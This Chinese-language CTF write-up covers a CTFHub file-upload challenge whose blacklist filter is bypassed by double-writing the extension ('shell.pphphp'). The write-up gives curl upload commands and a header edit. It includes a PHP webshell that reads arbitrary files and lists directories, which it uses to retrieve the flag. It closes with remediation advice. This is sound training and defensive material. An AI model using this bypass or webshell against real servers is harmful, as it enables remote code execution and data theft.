# CTFHub Writeup - 双写后缀

## 题目类型

WEB

## 0x01 题目信息
| 项目 | 内容 |
| --- | --- |
| 题目名称 | CTFHub 文件上传 - 双写绕过 |
| 靶场地址 | `http://challenge-ade9cbaf00fdbcb0.sandbox.ctfhub.com:10800` |
| 漏洞类型 | 文件上传（黑名单只删一次） |
| 绕过方式 | 文件名写成 `shell.pphphp` |
| 关键代码 | `str_ireplace($blacklist, "", $name)` |
| Flag | `ctfhub{2c38b6f2bcfe5dae3d8d6ecb}` |
## 0x02 漏洞原理
这题的服务端用黑名单过滤危险后缀，源码直接写在页面注释里：
```php
$name = basename($_FILES['file']['name']);
$blacklist = array("php", "php5", "php4", "php3", "phtml", "pht", "jsp", ...);
$name = str_ireplace($blacklist, "", $name);
```
`str_ireplace` 会把命中的关键词替换成空字符串，看起来是把 `php` 删掉了。但它有两个特点：
1. **只做一次替换**，替换完不会回头再检查新拼出来的字符串；
2. 替换是「删除」而不是「拦截」，删完之后剩下的字符会直接拼在一起。
于是可以「双写」：把 `php` 写成 `pphphp`。
```
shell.pphphp
```
`str_ireplace` 从左往右扫描，找到第一个 `php`（中间的 `p h p`）把它删掉，剩下：
```
shell.  +  p  +  hp   =   shell.php
```
删除后新拼出来的 `php` 不会再被检查，最终文件名就是 `shell.php`。
如果直接上传 `shell.php`，`php` 被删掉，文件名变成 `shell.`，后缀没了，自然不会执行——这就是为什么要双写。
## 0x03 解题过程
**3.1 看源码**
页面注释里给出了完整的过滤逻辑（见 0x02），可以确认：
- 只做黑名单替换，没有扩展名白名单；
- 没有 MIME 或文件头校验；
- 没有重命名，文件名原样保存。
**3.2 直接传 PHP**
先按常规传一个 `shell.php`：
```
curl -F "file=@shell.php;filename=shell.php" -F "submit=Submit" http://challenge-.../
```
返回：
```
<script>alert('上传成功')</script>
上传文件相对路径<br>upload/shell.
```
文件名里的 `php` 被删掉了，保存成了 `shell.`，访问不会执行。
**3.3 双写后缀**
把文件名改成 `shell.pphphp`：
```
curl -F "file=@shell.php;filename=shell.pphphp" -F "submit=Submit" http://challenge-.../
```
返回：
```
<script>alert('上传成功')</script>
上传文件相对路径<br>upload/shell.php
```
`pphphp` 里的第一个 `php` 被删掉，剩下的字符正好又拼成 `php`，文件名变成 `shell.php`。
**3.4 验证执行**
访问：
```
http://challenge-.../upload/shell.php
```
返回：
```
PWNED_OK
```
文件被 PHP 正常解析，拿到代码执行入口。
**3.5 找 flag**
再传一个读文件的脚本，文件名用 `read.pphphp`：
```php
<?php
$p = @$_GET["p"]; echo "R:" . @file_get_contents($p);
$d = @$_GET["d"]; if ($d != "") { echo "D:"; print_r(@scandir($d)); }
?>
```
上传后访问：
```
/upload/read.php?d=/var/www/html
```
回显：
```
Array
(
    [0] => .
    [1] => ..
    [2] => flag_82025853.php
    [3] => index.php
    [4] => upload
)
```
根目录下有一个随机命名的 `flag_82025853.php`。直接访问是空响应，因为内容整段是 PHP 注释：
```php
<?php // ctfhub{2c38b6f2bcfe5dae3d8d6ecb}
```
必须读源码：
```
/upload/read.php?p=/var/www/html/flag_82025853.php
```
回显：
```
R:<?php // ctfhub{2c38b6f2bcfe5dae3d8d6ecb}
```
拿到 Flag：
```
ctfhub{2c38b6f2bcfe5dae3d8d6ecb}
```
**3.6 换个双写位置**
`php` 写成 `phpphp` 也一样：
```
phpphp  →  删掉开头的 php  →  php
```
只要保证「删掉一个 `php` 之后，剩下的字符还能拼成 `php`」，就能绕过。本题用 `pphphp` 和 `phpphp` 都可以。
**3.6 用 Burp 改包**
浏览器把文件重命名为 `shell.pphphp` 再上传也行；更常见的做法是正常上传 `shell.php`，Burp 抓到后把请求体里的：
```
Content-Disposition: form-data; name="file"; filename="shell.php"
```
改成：
```
Content-Disposition: form-data; name="file"; filename="shell.pphphp"
```
其他部分不用动，放行后服务端会把 `pphphp` 还原成 `php`，落盘就是 `shell.php`。
**3.7 验证**
- 直接传 `shell.php` 得到 `shell.`，说明 `php` 确实被删；
- 传 `shell.pphphp` 得到 `shell.php`，说明删除只做一次、双写生效；
- 上传的 `.php` 能执行，说明没有重命名、目录允许解析；
- flag 文件内容与回显一致，长度为 32。
## 0x04 完整流程
| 步骤 | 操作 | 结果 |
| --- | --- | --- |
| 看源码 | 页面注释泄露过滤逻辑 | 黑名单 + `str_ireplace` |
| 直接传 | `filename=shell.php` | 变成 `shell.`，不执行 |
| 双写 | `filename=shell.pphphp` | 变成 `shell.php` |
| 验证执行 | 访问 `/upload/shell.php` | `PWNED_OK` |
| 找 flag | `scandir('/var/www/html')` | `flag_82025853.php` |
| 读源码 | `file_get_contents` | `<?php // ctfhub{...}` |
整条链路可以概括为：**黑名单只删一次 → 双写 `php` 为 `pphphp` → 删除后还原成 `php` → 上传执行 → 读 flag。**
## 0x05 踩坑记录
1. **`str_ireplace` 不递归**：它只扫描一遍，删除后新拼出来的字符不会再检查，这是双写能成立的根本原因。
2. **双写的位置要对**：`pphphp` 删掉中间的 `php` 后剩 `p` + `hp` = `php`；写成 `phpphp` 也一样。随便加一个 `php` 不一定行，要保证删除后能还原。
3. **大小写无所谓**：`str_ireplace` 的 `i` 表示不区分大小写，`pHp`、`PHP` 都会被删；双写同样适用。
4. **直接传 `shell.php` 会变成 `shell.`**：后缀被整个删掉，文件没有扩展名，服务器不会当 PHP 解析。
5. **文件名没有重命名**：所以才能精确访问 `/upload/shell.php`；如果服务端随机改名，双写就没意义了。
6. **上传目录能解析 PHP**：这是 getshell 的关键，目录禁止执行的话，双写也拿不到权限。
7. **flag 文件直接访问是空的**：`flag_*.php` 的内容是 `<?php // ctfhub{...}`，整行被注释，必须读源码。
8. **源码就在页面注释里**：这题把过滤逻辑直接写在了 HTML 注释中，先看源码能省很多试错。
9. **别用 `phtml` 去双写**：黑名单里还有 `phtml`、`php5`、`php4` 等，双写 `phtml` 删完不一定能还原成可用后缀；最稳的是拿 `php` 做双写，因为它是本题唯一能被服务器解析的后缀。
## 0x06 修复建议
1. **用白名单，不用黑名单**：只允许 `jpg`、`png`、`gif` 等明确的后缀，黑名单永远列不全。
2. **取最后一个后缀再判断**：用 `pathinfo()` 取扩展名并转小写，判断是否在白名单里，不要用字符串替换。
3. **随机重命名**：保存名由服务端生成，丢弃用户原始文件名，双写就没有意义了。
4. **上传目录禁止执行**：Nginx/Apache 对 `upload/` 关闭 PHP 解析，或把目录放到 Web 根之外。
5. **校验真实内容**：用 `finfo_file()` 或 `getimagesize()` 辅助判断，但不能替代目录禁执行。
6. **分离存储**：上传文件放独立域名或对象存储，配合鉴权下载。
## 0x07 总结
双写后缀的核心是：**过滤是「删除」而不是「拦截」，而且只删一次**。
`shell.php` 里的 `php` 被删掉，后缀就没了；但写成 `shell.pphphp`，删掉一个 `php` 后剩下的字符又拼成了 `php`，文件照样能执行。
这类漏洞说明黑名单本身就很脆弱：只要过滤逻辑不是「白名单 + 取最后一段后缀 + 重命名」，就总有办法绕过。防御上，白名单、重命名、目录禁执行三件套缺一不可。
